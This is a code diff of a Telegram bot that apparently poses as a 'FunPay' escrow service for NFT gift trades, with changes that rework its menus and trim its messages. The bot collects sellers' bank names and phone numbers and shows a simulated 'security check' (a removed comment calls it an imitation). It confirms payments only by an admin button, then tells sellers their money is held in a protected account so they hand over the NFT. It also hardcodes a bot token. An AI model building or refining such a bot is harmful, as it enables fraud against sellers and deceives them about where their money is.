@@ -6,22 +6,20 @@ from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKe
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from datetime import datetime
 
 # ================= НАСТРОЙКИ =================
 BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
 ADMIN_ID = 7532797597  
 SUPPORT_LINK = "https://t.me/FunPayHelperRU"
-COMMISSION_RATE = 0.03 # 3%
+COMMISSION_RATE = 0.03
 # ============================================
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# База данных в оперативке
-users_db = {}      # {user_id: {"bank": "...", "phone": "...", "lang": "RU"}}
-active_deals = {}  # Сделки
+users_db = {}
+active_deals = {}
 deal_counter = 1
 
 class CreateDeal(StatesGroup):
@@ -30,32 +28,35 @@ class CreateDeal(StatesGroup):
     wait_bank = State()
     wait_phone = State()
 
-# --- ГЕНЕРАТОР ID СДЕЛКИ ---
 def gen_deal_id():
     global deal_counter
     deal_id = f"FUN-{deal_counter:04d}"
     deal_counter += 1
     return deal_id
 
-# --- МЕНЮ ---
-def main_menu(user_id):
+# --- МЕНЮ (ИНЛАЙН, КРЕПИТСЯ К СООБЩЕНИЮ) ---
+def inline_main_menu(user_id):
     lang = users_db.get(user_id, {}).get("lang", "RU")
     
     if lang == "RU":
         kb = [
-            [KeyboardButton(text="🤝 Создать сделку")],
-            [KeyboardButton(text="📦 Мои сделки"), KeyboardButton(text="💳 Реквизиты")],
-            [KeyboardButton(text="🌐 Язык"), KeyboardButton(text="🆘 Поддержка")]
+            [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="menu_create")],
+            [InlineKeyboardButton(text="📦 Мои сделки", callback_data="menu_deals"),
+             InlineKeyboardButton(text="💳 Реквизиты", callback_data="menu_details")],
+            [InlineKeyboardButton(text="🌐 Язык", callback_data="menu_lang"),
+             InlineKeyboardButton(text="🆘 Поддержка", callback_data="menu_support")]
         ]
     else:
         kb = [
-            [KeyboardButton(text="🤝 Create deal")],
-            [KeyboardButton(text="📦 My deals"), KeyboardButton(text="💳 Details")],
-            [KeyboardButton(text="🌐 Language"), KeyboardButton(text="🆘 Support")]
+            [InlineKeyboardButton(text="🤝 Create deal", callback_data="menu_create")],
+            [InlineKeyboardButton(text="📦 My deals", callback_data="menu_deals"),
+             InlineKeyboardButton(text="💳 Details", callback_data="menu_details")],
+            [InlineKeyboardButton(text="🌐 Language", callback_data="menu_lang"),
+             InlineKeyboardButton(text="🆘 Support", callback_data="menu_support")]
         ]
-    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
+    return InlineKeyboardMarkup(inline_keyboard=kb)
 
-# --- СТАРТ ---
+# --- СТАРТ (ОДНО СООБЩЕНИЕ: КАРТИНКА + ТЕКСТ + ИНЛАЙН-КНОПКИ) ---
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     user_id = message.from_user.id
@@ -74,113 +75,88 @@ async def cmd_start(message: Message):
         "👇 Выберите нужный раздел ниже:"
     )
     
-    inline_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="start_create_deal")]
-    ])
-    
     await message.answer_photo(
         photo="AgACAgIAAxkBAAEDIx1q825ucePNRzdgkIAGbyBxZMNAdAACxyFrG23gmUtey3umHg-B8gEAAwIAA3MAAz0E",
         caption=welcome_text,
         parse_mode="HTML",
-        reply_markup=main_menu(user_id)
+        reply_markup=inline_main_menu(user_id)
     )
 
-# --- ОБРАБОТКА ИНЛАЙН-КНОПКИ СТАРТА ---
-@dp.callback_query(F.data == "start_create_deal")
-async def start_from_inline(call: CallbackQuery, state: FSMContext):
+# ================= ОБРАБОТЧИКИ ИНЛАЙН-МЕНЮ =================
+
+@dp.callback_query(F.data == "menu_back")
+async def menu_back(call: CallbackQuery):
+    await call.message.delete()
+    await cmd_start(call.message)
+    await call.answer()
+
+@dp.callback_query(F.data == "menu_create")
+async def menu_create(call: CallbackQuery, state: FSMContext):
     await call.message.delete()
     await start_deal_process(call.message, state)
     await call.answer()
 
-# --- МОИ СДЕЛКИ ---
-@dp.message(F.text.in_(["📦 Мои сделки", "📦 My deals"]))
-async def my_deals(message: Message):
-    user_deals = [d for d in active_deals.values() if d["seller_id"] == message.from_user.id or d["buyer_id"] == message.from_user.id]
+@dp.callback_query(F.data == "menu_deals")
+async def menu_deals(call: CallbackQuery):
+    user_deals = [d for d in active_deals.values() if d["seller_id"] == call.from_user.id or d["buyer_id"] == call.from_user.id]
+    
+    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
     
     if not user_deals:
-        return await message.answer("У вас пока нет сделок.")
+        return await call.message.edit_caption(caption="📦 У вас пока нет сделок.", reply_markup=back_kb)
     
     text = "<b>📦 История ваших сделок:</b>\n\n"
     for d in reversed(user_deals):
         status_emoji = "🟢" if d["status"] == "completed" else "🟡"
-        text += f"{status_emoji} <b>#{d['id']}</b> | {d['amount']} RUB\n"
-        text += f"└ Статус: {d['status'].upper()}\n\n"
+        text += f"{status_emoji} <b>#{d['id']}</b> | {d['amount']} RUB\n└ Статус: {d['status'].upper()}\n\n"
     
-    await message.answer(text, parse_mode="HTML")
+    await call.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=back_kb)
+    await call.answer()
 
-# --- РЕКВИЗИТЫ ---
-@dp.message(F.text.in_(["💳 Реквизиты", "💳 Details"]))
-async def my_details(message: Message):
-    user = users_db.get(message.from_user.id)
+@dp.callback_query(F.data == "menu_details")
+async def menu_details(call: CallbackQuery):
+    user = users_db.get(call.from_user.id)
+    back_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔄 Изменить", callback_data="menu_change_details")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]
+    ])
+    
     if user["bank"]:
         text = f"💳 <b>Ваши сохраненные реквизиты:</b>\n\n🏦 Банк: {user['bank']}\n📱 Тел: {user['phone']}"
     else:
-        text = "💳 У вас еще нет сохраненных реквизитов. Они появятся после создания первой сделки."
+        text = "💳 У вас еще нет сохраненных реквизитов."
     
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Изменить реквизиты", callback_data="change_details")]
-    ])
-    await message.answer(text, parse_mode="HTML", reply_markup=kb)
-
-@dp.callback_query(F.data == "change_details")
-async def change_details(call: CallbackQuery, state: FSMContext):
-    await call.message.edit_text("🏦 Введите название вашего банка:")
-    await state.set_state(CreateDeal.wait_bank)
+    await call.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=back_kb)
     await call.answer()
 
-# --- ЯЗЫК ---
-@dp.message(F.text.in_(["🌐 Язык", "🌐 Language"]))
-async def change_lang(message: Message):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_RU"),
-         InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_EN")]
-    ])
-    await message.answer("Выберите язык / Choose language:", reply_markup=kb)
+@dp.callback_query(F.data == "menu_support")
+async def menu_support(call: CallbackQuery):
+    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
+    text = f"🆘 <b>Техническая поддержка</b>\n\nЕсли у вас возникли вопросы, напишите нашему менеджеру:\n👉 {SUPPORT_LINK}"
+    await call.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=back_kb)
+    await call.answer()
 
-@dp.callback_query(F.data.startswith("lang_"))
-async def set_lang(call: CallbackQuery):
-    lang = call.data.split("_")[1]
-    users_db[call.from_user.id]["lang"] = lang
-    await call.message.delete()
-    await call.message.answer("Язык успешно изменен!" if lang == "RU" else "Language changed successfully!", reply_markup=main_menu(call.from_user.id))
-
-# --- ПОДДЕРЖКА ---
-@dp.message(F.text.in_(["🆘 Поддержка", "🆘 Support"]))
-async def support(message: Message):
-    await message.answer(
-        f"🆘 <b>Техническая поддержка</b>\n\n"
-        f"Если у вас возникли вопросы по сделке или работе сервиса, напишите нашему менеджеру:\n"
-        f"👉 {SUPPORT_LINK}",
-        parse_mode="HTML"
-    )
-
-# --- 1. СОЗДАНИЕ СДЕЛКИ (АВТОМАТИЗАЦИЯ) ---
+# --- 1. СОЗДАНИЕ СДЕЛКИ ---
 async def start_deal_process(message: Message, state: FSMContext):
     user = users_db.get(message.from_user.id)
     
     if user["bank"]:
-        await message.answer(f"✅ Использую ваши сохраненные реквизиты:\n🏦 {user['bank']}\n📱 {user['phone']}\n\n💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
+        await message.answer(f"✅ Использую ваши реквизиты:\n🏦 {user['bank']}\n📱 {user['phone']}\n\n💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
         await state.update_data(bank=user["bank"], phone=user["phone"])
         await state.set_state(CreateDeal.amount)
     else:
-        await message.answer("🏦 <b>У вас еще нет сохраненных реквизитов.</b>\n\nВведите название вашего банка (например: Сбербанк, Тинькофф):", parse_mode="HTML")
+        await message.answer("🏦 <b>Введите название вашего банка:</b>", parse_mode="HTML")
         await state.set_state(CreateDeal.wait_bank)
-
-@dp.message(F.text == "🤝 Создать сделку")
-async def create_deal_btn(message: Message, state: FSMContext):
-    await start_deal_process(message, state)
 
 @dp.message(CreateDeal.wait_bank)
 async def process_bank(message: Message, state: FSMContext):
     await state.update_data(bank=message.text)
-    await message.answer("📱 Введите ваш номер телефона (привязанный к карте):")
+    await message.answer("📱 Введите ваш номер телефона:")
     await state.set_state(CreateDeal.wait_phone)
 
 @dp.message(CreateDeal.wait_phone)
 async def process_phone(message: Message, state: FSMContext):
     await state.update_data(phone=message.text)
-    
-    # Сохраняем в профиль
     data = await state.get_data()
     users_db[message.from_user.id]["bank"] = data["bank"]
     users_db[message.from_user.id]["phone"] = data["phone"]
@@ -204,7 +180,6 @@ async def process_nft(message: Message, state: FSMContext):
     data = await state.get_data()
     await state.clear()
     
-    # Имитация проверки
     msg = await message.answer("⏳ <i>Проверка данных и создание защищенной сделки...</i>", parse_mode="HTML")
     await asyncio.sleep(2)
     
@@ -225,16 +200,14 @@ async def process_nft(message: Message, state: FSMContext):
     pay_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
     
     await msg.edit_text(
-        f"✅ <b>Сделка успешно создана и защищена!</b>\n\n"
-        f"🆔 ID сделки: <code>{deal_id}</code>\n"
+        f"✅ <b>Сделка успешно создана!</b>\n\n"
+        f"🆔 ID: <code>{deal_id}</code>\n"
         f"💰 Сумма: {data['amount']} RUB\n"
         f"🏦 Реквизиты: {data['bank']} ({data['phone']})\n\n"
-        f"<b>Ссылка для покупателя:</b>\n<code>{pay_link}</code>\n\n"
-        f"<i>Отправьте эту ссылку покупателю.</i>",
+        f"<b>Ссылка для покупателя:</b>\n<code>{pay_link}</code>",
         parse_mode="HTML"
     )
     
-    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
@@ -316,9 +289,9 @@ async def admin_confirm(call: CallbackQuery):
     
     deal_id = call.data.split("_")[2]
     deal = active_deals.get(deal_id)
-    
     deal["status"] = "paid"
-    await call.message.edit_text(f"✅ Сделка {deal_id} подтверждена. Средства зарезервированы.")
+    
+    await call.message.edit_text(f"✅ Сделка {deal_id} подтверждена.")
     
     commission = round(deal['amount'] * COMMISSION_RATE)
     net_amount = deal['amount'] - commission
@@ -327,12 +300,10 @@ async def admin_confirm(call: CallbackQuery):
         f"✅ <b>Средства по сделке получены и зарезервированы!</b>\n\n"
         f"📄 <b>Детали:</b>\n"
         f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
-        f"├ Комиссия сервиса (3%): <b>{commission} RUB</b>\n"
+        f"├ Комиссия (3%): <b>{commission} RUB</b>\n"
         f"├ <b>К зачислению: {net_amount} RUB</b>\n"
         f"└ Товар: {deal['nft_link']}\n\n"
-        f"Покупатель успешно перевел средства. Они находятся на защищенном счете FunPay.\n\n"
-        f"Передайте NFT покупателю. После подтверждения передачи, средства будут зачислены на ваши реквизиты ({deal['bank_name']}: {deal['phone']}).\n\n"
-        f"<i>Для завершения нажмите кнопку ниже.</i>"
+        f"Передайте NFT покупателю и нажмите кнопку ниже."
     )
     
     seller_kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -341,7 +312,7 @@ async def admin_confirm(call: CallbackQuery):
     
     try:
         await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
-        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nСредства зарезервированы. Ожидайте получения NFT.", parse_mode="HTML")
+        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nОжидайте получения NFT.", parse_mode="HTML")
     except: pass
 
 @dp.callback_query(F.data.startswith("admin_reject_"))
@@ -356,8 +327,8 @@ async def admin_reject(call: CallbackQuery):
     await call.message.edit_text(f"❌ Сделка {deal_id} отклонена.")
     
     try:
-        await bot.send_message(deal["seller_id"], f"❌ <b>Сделка {deal_id} отклонена.</b>\nПричина: подозрительная активность аккаунта. Средства не были зарезервированы.", parse_mode="HTML")
-        await bot.send_message(deal["buyer_id"], f"❌ <b>Сделка {deal_id} отклонена администратором.</b>\nЕсли вы перевели средства, напишите в поддержку: {SUPPORT_LINK}", parse_mode="HTML")
+        await bot.send_message(deal["seller_id"], f"❌ <b>Сделка {deal_id} отклонена.</b>\nПричина: подозрительная активность.", parse_mode="HTML")
+        await bot.send_message(deal["buyer_id"], f"❌ <b>Сделка {deal_id} отклонена администратором.</b>", parse_mode="HTML")
     except: pass
 
 # --- 5. ПРОДАВЕЦ ПЕРЕДАЛ NFT ---
@@ -368,12 +339,9 @@ async def seller_done(call: CallbackQuery):
     deal["status"] = "moderation"
     
     await call.message.edit_text(
-        f"⏳ <b>Заявка на завершение сделки принята!</b>\n\n"
-        f"🛡 <b>Система безопасности:</b>\n"
-        f"├ Статус: <i>Передано в отдел модерации</i>\n"
-        f"├ Проверка транзакции: <i>В процессе...</i>\n"
-        f"└ Ожидаемое время: <i>до 15 минут</i>\n\n"
-        f"<i>Алгоритм проверяет историю передачи подарка. Ожидайте уведомления.</i>",
+        f"⏳ <b>Заявка принята!</b>\n\n"
+        f"🛡 Статус: <i>Передано в отдел модерации</i>\n"
+        f"└ Ожидаемое время: <i>до 15 минут</i>",
         parse_mode="HTML"
     )
     
@@ -386,9 +354,7 @@ async def seller_done(call: CallbackQuery):
         text=f"🛡 <b>АДМИН: ЗАПРОС НА МОДЕРАЦИЮ</b>\n\n"
              f"🆔 ID: {deal_id}\n"
              f"👤 Продавец: @{deal['seller_name']}\n"
-             f"💰 Сумма: {deal['amount']} RUB\n"
-             f"🖼 NFT: {deal['nft_link']}\n\n"
-             f"Продавец заявил о передаче. Подтвердите для закрытия сделки.",
+             f"💰 Сумма: {deal['amount']} RUB",
         parse_mode="HTML",
         reply_markup=admin_kb
     )
@@ -414,15 +380,13 @@ async def admin_confirm_nft(call: CallbackQuery):
             f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
             f"✅ <b>Модерация успешно завершена!</b>\n\n"
             f"Передача NFT подтверждена. Сделка закрыта.\n"
-            f"К зачислению: <b>{net_amount} RUB</b> (за вычетом комиссии 3%).\n\n"
-            f"<i>Спасибо за использование нашего сервиса!</i>", 
+            f"К зачислению: <b>{net_amount} RUB</b> (за вычетом комиссии 3%).", 
             parse_mode="HTML"
         )
         await bot.send_message(
             deal["buyer_id"], 
             f"🎉 <b>Сделка {deal_id} успешно завершена!</b>\n\n"
-            f"🛡 <b>Система безопасности подтвердила передачу NFT.</b>\n"
-            f"Проверьте ваш кошелек. Спасибо, что доверяете нам!", 
+            f"🛡 Проверьте ваш кошелек. Спасибо, что доверяете нам!", 
             parse_mode="HTML"
         )
     except: pass
